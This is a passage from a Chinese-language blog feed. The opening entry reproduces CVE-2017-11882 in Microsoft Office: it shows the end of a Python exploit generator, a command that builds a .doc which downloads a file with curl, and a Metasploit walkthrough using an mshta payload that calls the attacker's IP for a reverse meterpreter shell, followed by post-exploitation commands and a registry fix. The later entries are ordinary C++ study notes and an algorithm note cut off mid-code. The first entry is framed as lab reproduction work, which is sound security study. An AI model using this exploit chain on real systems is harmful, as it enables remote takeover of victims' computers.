class="string">&quot;&#123;\*\datastore&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> r_header</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建解析对象</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PoC for CVE-2017-11882&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Command run in target system&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&quot;--output&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Output exploit rtf&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Input normal rtf.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析参数</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 制作rft文件的头部</span></span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">input</span> != <span class="literal">None</span>:</span><br><span class="line">        r_header = getrheader(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r_header = head</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 制作漏洞触发文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.output,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(genrtf(args.cmd,r_header))</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印完成信息</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Done ! output file --&gt; &quot;</span> + args.output </span><br></pre></td></tr></table></figure><h3 id="远程下载"><a href="#远程下载" class="headerlink" title="远程下载"></a>远程下载</h3><p>这里给一个远程下载的示例</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里使用109或605字节版本的poc均可</span></span><br><span class="line">python2 Command109b_CVE-2017-11882.py -c &#x27;cmd.exe /k &quot;md d:\demo&amp;cd /d d:\demo&amp;curl https://down.52pojie.cn/Tools/PEtools/LordPE.7z -o LordPE.zip&quot;&#x27; -o 11882-6.doc</span><br></pre></td></tr></table></figure><h4 id="cmd用法参照"><a href="#cmd用法参照" class="headerlink" title="cmd用法参照"></a>cmd用法参照</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMD </span><br><span class="line">/C      执行完关闭cmd窗口</span><br><span class="line">/K      执行完保留cmd窗口</span><br></pre></td></tr></table></figure><h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h4><ul><li><strong>aa &amp;&amp; bb</strong>：执行aa，成功后再执行bb</li><li><strong>aa || bb</strong>：先执行aa，若执行成功则不再执行bb，若失败则再执行bb</li><li><strong>aa &amp; bb</strong>：先执行aa再执行bb，无论aa是否成功</li></ul><p><strong>PS：</strong>本地捆绑的尝试可以看看利用<a href="https://www.dqywy.top/post/ed8f2b51.html">CVE-2017-11882尝试本地捆绑</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>参考文章</strong>：<br><a href="https://zhuanlan.zhihu.com/p/35248996">[漏洞复现] CVE-2017-11882 通杀所有Office版本</a><br><a href="https://www.freebuf.com/column/183551.html">Office系列漏洞之CVE-2017-11882</a></p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p>攻击机：kali</p></li><li><p>靶机：win7，安装office</p><p><a href="https://msdn.itellyou.cn/">office(先在主机上打开iso文件再传到虚拟机)</a></p><p><a href="http://office2007xiazai.com/xuliehaomiyue/">office2007激活码(其他版本上网搜)</a></p></li><li><p><a href="https://blog.csdn.net/qq_38924942/article/details/88206330">关闭win7的ASLR</a></p></li><li><p>关闭win7防火墙：开始-&gt;控制面板-&gt;系统与安全</p></li><li><p>虚拟机之间互相需要可以ping通：均使用net模式；编辑-&gt;虚拟网络编辑器-&gt;查看子网ip、win7(ipconfig)、kali(ifconfig)，保证在同一个网段</p></li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li><p>将<a href="https://github.com/Ridter/CVE-2017-11882">poc代码</a>和<a href="https://github.com/0x09AL/CVE-2017-11882-metasploit">组件</a>下载到kali</p></li><li><p>把<code>cve_2017_11882.rbcopy</code>移动到kali的<code>/usr/share/Metasploit-framework/modules/exploits/windows/smb</code><br>把<code>cve-2017-11882.rtf</code>移动到kali的<code>/usr/share/metasploit-framework/data/exploits</code></p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入Metasploit框架，在kali终端输入命令：</span></span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用CVE-2017-11882.rb模块</span></span><br><span class="line">use exploit/windows/smb/cve_2017_11882</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置tcp反弹会话</span></span><br><span class="line">set payload windows/meterpreter/reverse_tcp  </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置渗透机ip地址（这里通过ifconfig命令查看）</span></span><br><span class="line">set lhost 攻击机ip</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置路径为11882，可自定义</span> </span><br><span class="line">set uripath 11882 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启渗透，进入监听状态，只能开一个</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成带有shell的doc文件</span></span><br><span class="line"><span class="comment"># 使用python2避免python报错：&#x27;hex&#x27; is not a text encoding; use codecs.encode() to handle arbitrary codecs</span></span><br><span class="line">python2 Command109b_CVE-<span class="number">2017</span>-<span class="number">11882.</span>py -c <span class="string">&quot;mshta http://渗透机ip:8080/11882&quot;</span> -o <span class="number">11882.</span>doc</span><br></pre></td></tr></table></figure><p>将doc文档移动到win7并打开，即可看到kali的监听端出现win7的shell</p><p><strong>成功截图</strong></p><p><img src="https://image.3001.net/images/20180907/1536303312_5b9220d0ce45d.jpg!small" alt="success"></p><p><strong>后续操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过命令sessions查看meterpreter会话：</span></span><br><span class="line">sessions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入会话</span></span><br><span class="line">sessions id(1或2或3...)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统信息</span>  </span><br><span class="line">sysinfo  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前用户</span>  </span><br><span class="line">getuid  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截屏</span>  </span><br><span class="line">screenshot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入windows命令行窗口</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><h2 id="漏洞修复：取消该模块的注册"><a href="#漏洞修复：取消该模块的注册" class="headerlink" title="漏洞修复：取消该模块的注册"></a>漏洞修复：取消该模块的注册</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在cmd输入下列命令</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\MICROSOFT\Office\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot;</span> /v <span class="string">&quot;Compatibility Flags&quot;</span> /t REG_DWORD /d 0x400</span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Wow6432Node\Office\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot;</span> /v <span class="string">&quot;Compatibility Flags&quot;</span> /t REG_DWORD /d 0x400</span><br></pre></td></tr></table></figure><h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><code>Winexec</code>：主要用于运行exe文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UINT <span class="title function_">Winexec</span><span class="params">(exePath, ShowCmd)</span>;</span><br></pre></td></tr></table></figure><p><code>CreateProcess</code>：用于创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件</p><p>x32dbg<code>ctrl + G</code>: 输入函数名可以定位函数位置，或者输入内存地址可以进行跳转</p><p>进入函数时(第一个push还未执行)的ESP就是这个函数的返回地址，可以使用监视一直盯着这个地址的值看是否被改变</p><p><code>ESP</code>、<code>EBP</code>指向的是存有数据的地址。你想嘛，mov eax, [ebp] 这个操作是不会修改ebp的值的，所以ebp指向的肯定是有效地址而非一个空位置</p><p><a href="https://blog.csdn.net/jiust12138/article/details/100930338">3CDaemon FTP使用教程</a>：主机搭建FTP服务器供虚拟机访问，<code>Vmware tools</code>用不了的时候可以用这个传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [ebx+8]</span><br><span class="line"># lea就是load effective address，加载有效地址</span><br><span class="line"># 上述语句的意思是：将ebx+8赋给eax</span><br><span class="line"></span><br><span class="line"># 与mov区别：</span><br><span class="line">mov eax, [ebx+8]</span><br><span class="line"># 该语句是将地址为ebx+8的数据赋给eax</span><br></pre></td></tr></table></figure><h2 id="遇到别的问题的解决方案："><a href="#遇到别的问题的解决方案：" class="headerlink" title="遇到别的问题的解决方案："></a>遇到别的问题的解决方案：</h2><ul><li><a href="https://segmentfault.com/a/1190000040641247">解决win7安装Vmware tools(1)</a></li><li><p><a href="https://blog.csdn.net/teisite/article/details/117675403">解决win7安装Vmware tools(2)</a></p></li><li><p><strong>OD</strong>报<code>UDD路径错误</code>：</p><ol><li><p>去除UDD路径上所有中文名称</p></li><li><p>OD-&gt;Options-&gt;Appearance-&gt;手动设置UDD路径</p></li></ol></li><li><p>因为<strong>od</strong>的启动需要管理员模式，导致<code>exe</code>被挂载了<strong>od</strong>之后也需要<strong>管理员模式</strong>才能启动(喵的这点上费了我好长时间，最后还是选择使用xdbg)</p></li><li><p>注册表中没有<strong>EQNEDT32.EXE</strong>，有两种方法：</p><ol><li><p>打开注册表定位到<code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>-&gt; 右键新建项命名为<strong>EQNEDT32.EXE</strong>-&gt;在该项中右键新建字符串Debbuger，值设置为调试器位置(xxx.od.exe)</p></li><li><p>使用<code>windbg.exe</code>同级目录下的<code>gflags.exe</code>的<code>image files</code>选项输入<strong>EQNEDT32.EXE</strong>与调试器的绝对路径</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> CVE剖析 </category>
          
          <category> 捆绑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 捆绑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++结课小结</title>
      <link href="/post/9b670e9a.html"/>
      <url>/post/9b670e9a.html</url>
      
        <content type="html"><![CDATA[<h2 id="期末周终于结束了哭唧唧-明天考完C-就正式进入暑假啦！"><a href="#期末周终于结束了哭唧唧-明天考完C-就正式进入暑假啦！" class="headerlink" title="期末周终于结束了哭唧唧~明天考完C++就正式进入暑假啦！"></a><strong>期末周终于结束了哭唧唧~明天考完C++就正式进入暑假啦！</strong></h2><ul><li><p>对象所占据的空间只是用于存放<code>数据成员</code>，函数成员不计入，函数的代码在内存中只占据一份空间</p></li><li><p>使用复制构造函数的情形:</p><p>​    用类的一个对象去初始化另一个对象时<br>​    当函数的形参是类的对象时（也就是值传递时），如果是引用传递则不会调用<br>​    当函数的返回值是类的对象时</p></li><li><p>未定义复制构造函数系统会自动给出，并且会执行: 浅复制(复制对象在内存中的每一个bit)</p><p>​    浅复制是在复制这个对象的时候，让数据中的新旧对象指向同一个外部内容，析构的时候容易发生重复释放<br>​    深复制是在复制这个对象的时候，为数据中的对象制作了外部对象的独立复制。</p></li><li><p>复制构造函数有且仅有一个</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复制构造，在定义对象的时候&#x27;=&#x27;是传参的意思</span></span><br><span class="line">A a;</span><br><span class="line"><span class="function">A <span class="title">b</span><span class="params">(a)</span> <span class="comment">// 等价于 A b=a; </span></span></span><br><span class="line"><span class="function"><span class="comment">// 赋值</span></span></span><br><span class="line"><span class="function">A a, b</span>;</span><br><span class="line">b = a;  </span><br></pre></td></tr></table></figure></li><li><p>函数名后面加const表示为常函数，在该函数当中不可以修改变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getx</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br></pre></td></tr></table></figure></li><li><p>函数参数尽量使用常引用而不是值，传递对象值会引起复制构造和析构，增加时间和空间开销</p></li><li><p>一个空类会自带四个函数: 构造函数，析构函数，复制构造函数，重载<br>析构函数由系统调用(不可以由程序调用)，’~’不属于字母、数字或下划线，不是函数名</p></li><li><p>‘&amp;&amp;a’: 右值引用</p></li><li><p>先构造的对象后析构(栈)</p></li><li><p>有生命的变量不一定能访问，局部定义静态变量在整个程序运行期间存在但是在主函数没法访问(private)</p></li><li><p>在类当中定义静态变量，数据改变只用修改一次，不用在每个对象都改一遍</p></li><li><p>类的静态数据成员为该类的所有对象共享，必须在类外定义和初始化(静态成员函数在类外定义不需要写static)，用::指明所属的类</p></li><li><p>只有构造函数和复制构造函数有冒号初始化用法</p></li><li><p>静态成员函数不可以访问非静态成员(故静态成员函数中的函数也是静态成员函数!!!)：因为静态成员函数是大家共有，非静态变量每个对象都有一个，如果通过类名+静态成员函数的方式调用的话不能确定输出哪一个对象的非静态变量</p></li><li><p>非友元函数访问私有成员的方法: 定义类的公有成员函数返回私有成员的值</p></li><li><p>A是B的友元，B不一定是A的友元，即友元关系是单向的</p></li><li><p>string类可以直接比较，不用字符串函数</p></li><li><p>全局变量和局部变量同名想要使用全局变量：::y(加全局作用域符)</p></li><li><p>定义类和函数的时候要注意顺序，如果类A要使用类B而类B的定义在类A之后，应该在类A之前先声明类B：class B;    函数同理</p></li><li><p>student  stu[N];-&gt;对象数组已经被声明定义，只有靠赋值-&gt;stu[i] = student(id, score);</p></li><li><p>函数重载的要求(任选其一): 参数个数不同；参数类型不同；参数顺序不同；函数和自己的常函数</p><p><strong>注意：编译器不会以<code>返回值</code>区分函数</strong></p></li><li><p>常对象只能调用常成员函数，普通对象可以调用常成员函数和普通成员函数，但是会优先调用普通成员函数</p></li><li><p>常数据成员只能通过构造函数的冒号初始化或者在类外初始化，不能通过赋值初始化</p></li><li><p>常引用只是名字是常量，但它所指向的数据并非常数据，例如：一个对象a，其常引用是b，那么通过b不可以修改该对象成员，但是用a可以改变</p></li><li><p>头文件用双引号兼容尖括号，双引号会先查本地路径再查系统路径</p></li><li><p>友元函数可以在类里面定义，并且不会将其当作成员函数</p></li><li><p>int *p = new int(5), 小括号是赋值！！！中括号才是数组</p></li><li><p>this指针是常量，不可以赋值</p></li><li><p>new和delete可以达到的功能比malloc和free更强，可以实现在生成一个新的对象指针的同时进行构造并传入参数，并且delete会自动析构对象</p></li><li><p>默认构造函数=缺省构造函数</p></li><li><p>继承不会吸收构造函数和析构函数，派生类的构造函数与析构函数要自己写或者使用系统默认</p></li><li><p>赋值通过派生类传入，如果要用到基类的方法或者属性要通过派生类传入(构造函数冒号传入)</p></li><li><p>如果基类中有默认构造函数，派生类可以不定义构造函数，都使用默认构造函数</p></li><li><p>使用const定义时必须赋初值(可以不是编译期间可见的值，比如int b = 25;    const int a = b;)</p></li><li><p>如果一个类包含多个对象成员，对象成员的构造函数的调用顺序由它们在该类中的说明顺序决定，而它们在初始化表中的顺序无关</p></li><li><p>重载运算符以后运算符对重载的数据类型的原有操作被弃用，但是对于其他类型的数据仍然可以使用</p></li><li><p>函数形参中，基类形参包容派生类实参，派生类形参不包含基类实参(派生类形参可能含有新的属性或方法，但基类实参中不存在)</p></li><li><p>标识符，包括变量名、常量名、对象名、函数名、类型名</p><pre><code>命名规则：    1.标识符用字母A-Z,a-z,数字0-9和下划线_构成；    2.以字母（大小写）或者下划线_开头，开头不可以使用数字；    3.不能与c编译系统已经预定义的、具有特殊用途的保留标识符（即关键字）同名。比如，不能将标识符命名为float,auto,break,case,this,try,for,while,int,char,short, unsigned,等等；    4.不允许出现标点字符，比如 @、&amp; 和 %。</code></pre></li><li><p>字符常量：</p><pre><code>    （1）\b：光标前移一位，同时会覆盖后面的内容      （2）\r：将光标移到本行开头      （3）\f： 在C++中，\f仅仅会打出一个小正方形□，代表换页符      （4）\v： 竖向跳格，就是将光标移到下一行的同样位置，但是，在C++中，\v照样会输出一个替代的符号□</code></pre></li><li><p>枚举类型定义了一些整型符号常量的集合，</p><pre><code>    枚举类型的第一个常量默认值是0。       枚举类型常量的值允许彼此相同      虽然枚举类型常量是整数类型，但是不允许使用整数直接赋值给枚举类型变量，也不允许与整数进行运算，只可以与整数进行比较      在没有显式说明的情况下，枚举类型中的第一个枚举常量的值为0，第二个为1，以此类推。如果只指定了部分枚举常量的值，那么未指定值的枚举常量的值将依着最后一个指定值向后递增（步长为1）</code></pre></li><li><p>真正编译后，编译器会加入 Run-time 库的 Startup 代码，它才是程序执行的真正入口。执行完 Startup 代码后，程序再调用用户代码的 main 函数执行。</p><pre><code>Startup 代码中一般会获得命令行，获得进程句柄等。做好 main 函数的准备工作。而且不同的编译器，不同的平台，Startup 代码也不同。</code></pre></li><li><p>在c++结构化程序设计框架中，程序的基本组成单元是函数</p></li><li><p>c++是面向过程和对象的程序设计语言</p></li><li><p>多态性是指一个面向对象的系统常常要求一组具有相同基本语义的方法能在同一接口下为不同的对象服务</p></li><li><p>面向对象的基本原理：使用现实世界的概念抽象地思考问题从而自然的解决问题</p></li><li><p><code>自顶向下</code>属于结构化程序设计方法，可复用不属于结构化程序设计方法</p></li><li><p>面向对象程序设计主要考虑的是提高软件的<code>可重用性</code></p></li><li><p>正确的程序注释一般包含序言性注释和功能性注释</p></li><li><p>引用必须在定义时初始化，而且一旦初始化之后，就不能再成为其他变量的引用</p></li><li><p>输入缓冲区和输出缓冲区可以重叠：在dos窗口上输入的数据，都会被放在输入缓冲区中，但是输入进去时也会显示在输出缓冲区上</p></li><li><p>break对于while和for循环都是直接退出，应该使用continue表示进行下一次循环</p></li><li><p>c/c++实型数据：实型数据表示形式有两种，即十进制小数形式（十六进制、八进制二进制不对）和指数形式<br>一般形式：12.5、.6f（f表示浮点数类型）== 0.6<br>指数形式：E可以大写或小写，整数部分和小数部分可以省略其一，但不能都省略，得是整数(1E.02不对)</p></li><li><p>函数重载的前提条件为不同函数实现的功能<code>完全相同</code></p></li><li><p>友元类之间的关系，不能传递，不能继承</p></li><li><p>被abstract修饰的类，称为抽象类，抽象类不能被实例化，即不能使用new创建一个对象，只能被继承</p></li><li><p>类的组合关系：Has-A；继承和派生：Is-A</p></li><li><p>一般是将非常短小的函数声明为<code>内联函数</code>(inline)，且是否生效是由<code>编译器</code>决定</p></li><li><p>派生类中的虚函数会覆盖基类的虚函数，还会隐藏基类中同名函数的其他所有重载形式</p></li><li><p>STL中关联型容器都是<code>有序</code>的</p></li><li><p>覆盖: 派生类中定义和基类<code>完全相同</code>的成员</p></li><li><p>派生类指针不能用基类对象赋值；基类指针可以用派生类对象赋值;  <strong>看指针需要访问到的东西，赋值的数据是不是都有</strong></p></li><li><p>派生类构造顺序：基类、对象成员、派生类本身-&gt;派生类多继承时按照对基类继承顺序执行初始化，再按照对象成员的说明顺序初始化最后执行派生类的初始化</p></li><li><p>派生类析构顺序与构造顺序相反</p></li><li><p>二义性问题: 派生类从不同方向继承同一个基类(菱形)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解决方法：</span><br><span class="line">虚基类：菱形第二层的两个基类虚继承顶层基类(<span class="keyword">class</span> B1 : <span class="keyword">virtual</span> <span class="keyword">public</span> B), 构造第二个对象的时候引用第一次定义的最高基类</span><br><span class="line">同名隐藏：在派生类中定义同名成员</span><br><span class="line">类名限定</span><br></pre></td></tr></table></figure></li><li><p>带参构造函数: 顶部基类的参数是由底部派生类决定，中间的两个基类不起作用</p></li><li><p>多继承普通基类按继承顺序构造，多继承普通基类和虚基类，<strong>先构造虚基类</strong></p></li><li><p>最派生类给最基类传了参数，中间基类也得在构造函数传参</p></li><li><p>初始化列表不会影响构造顺序，但是多继承的继承顺序会影响</p></li><li><p>类指针的输出会参考指针类型</p></li><li><p>传入对象<code>数组</code>，不可以用引用来接收，要用指针！</p></li><li><p>纯虚函数也是虚函数，纯虚函数的<code>=0</code>不是赋值，是一个语法标识</p></li><li><p>抽象类不能定义对象，但是<code>可以定义指针</code>(<strong>定义指针不用创建对象</strong>)，也<code>可以定义引用</code>(引用的是别的对象)</p></li><li><p>有至少一个<code>纯虚函数</code>的类是抽象类</p></li><li><p>抽象类只能作为基类，基类需要有构造和析构(派生类不会吸收基类的构造和析构函数)</p></li><li><p>抽象类是不完整的因为纯虚函数不完整(没有定义实现)</p></li><li><p>派生类继承抽象类，派生类只有一个函数，<strong>纯虚函数不算</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;<span class="comment">// 本来有两个display函数，但是纯虚函数不完整，所以只算一个</span></span><br></pre></td></tr></table></figure></li><li><p>虚函数是在派生类定义与基类<strong>完全相同</strong>的函数</p></li><li><p>虚函数必须是<code>非静态</code>的成员函数，静态成员函数无法区分是哪个对象, <strong>构造函数不能是虚函数</strong>，<strong>析构函数可以（</strong>构造函数执行时对象还未创建好，析构函数执行时对象创建好了）</p></li><li><p>运行时多态：Base *p; p-&gt;fun()//fun为虚函数 则无法确定调用哪个函数</p></li><li><p>基类指针和基类引用可以使用基类和派生类对象赋值，实现多态(基类<code>指针</code>或<code>引用</code>+<code>虚函数</code>-&gt;多态)</p></li><li><p>绑定:确定执行哪个函数；绑定=联编；动态绑定 = 动态联编 = 运行时多态，静态绑定 = 静态联编 = 编译时多态</p></li><li><p>基类必须加virtual,派生类可加可不加</p></li><li><p>虚函数看对象类型，不是指针类型(运行时多态)</p></li><li><p>虚析构函数:防止使用基类析构函数析构派生类对象</p></li><li><p>Base *pb = new Derived;  delete pb;  // 删除只看指针类型进行析构，故只有Base的析构，会导致派生类对象无法析构，所以应该将基类的<code>析构函数</code>定义为<code>虚函数</code></p></li><li><p>模板有两种，类模板和函数模板，类模板产生模板类，函数模板产生模板函数</p></li><li><p>一个函数/类模板可以生成无数多个模板函数/类</p></li><li><p>模板在编译后形成对应实例但是<code>模板消失</code></p></li><li><p><code>#include &lt;bits/stdc++.h&gt;</code>：通用的包含文件</p></li><li><p>函数模板不再满足要求时可以重载函数</p></li><li><p><code>#include &lt;cstdlib&gt;</code>：c语言的stdlib.h</p></li><li><p>s.getNum() = 8; // 如果返回的是私有成员的引用(需长期存在)，则可以用这种方式修改私有成员</p></li><li><p><code>#include &lt;assert&gt;</code>：c语言的断言</p><pre><code>assert(num &gt;= 0); // 如果num &lt; 0则程序崩溃</code></pre></li><li><p>深赋值：对象之间的深赋值需要重载”=”并对数组等数据重新申请内存并赋值，并且需要删除原有内容</p></li><li><p>if (this != &amp; rhs)    // 防止自我赋值</p></li><li><p>寻找素数：从2~sqrt(num)列出所有素数，如果num不可以被其中的任一素数整除，则num为素数</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比特串求解排名第k位的数据</title>
      <link href="/post/4e4f7387.html"/>
      <url>/post/4e4f7387.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近听一个学长讲了如何利用比特串求解排名第<code>k</code>位的数据，觉得还挺巧妙的</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下面以求解排名第<code>k</code>位和成绩第<code>k</code>小(即倒数排名为<code>k</code>)的学生成绩为例解释算法思路：</p><ul><li><p>录入学生成绩后，将成绩转换为比特串，规则如下：</p><blockquote><p>定义一个容量为101的整型数组存放比特串并初始化为0，学生成绩为n则数组下标为n的数据置1（<code>0≤n≤100</code>，故数组容量定为101）</p><p>例如：一个容量为<code>6</code>数据为<code>2</code>的数组按上述规则应为<code>&#123;0, 0, 1, 0, 0, 0&#125;</code></p></blockquote></li><li><p>将每个学生成绩的比特串逐列相加，得到一个聚合后的比特串</p><blockquote><p>例如：<code>&#123;0, 0, 0, 1, 0, 0&#125;</code> 与 <code>&#123;1, 0, 0, 0, 0, 0&#125;</code>聚合后为<code>&#123;1, 0, 0, 1, 0, 0&#125;</code></p></blockquote></li><li><p>要得到排名为<code>k</code>(成绩相同认为排名相同)的学生成绩，只需要定义一个初值为0的<code>sum</code>，从高位下标向低位下标依次加上聚合比特串数组的数据，直到<code>sum ≥ k</code>，对应的下标就是排名为<code>k</code>的学生成绩</p></li><li>同理：要得到第<code>k</code>小的学生成绩，我们可以定义一个初值为0的<code>sum</code>，从低位下标向高位下标依次加上聚合比特串数组的数据，直到<code>sum ≥ k</code>，对应的下标就是第<code>k</code>小的学生成绩</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 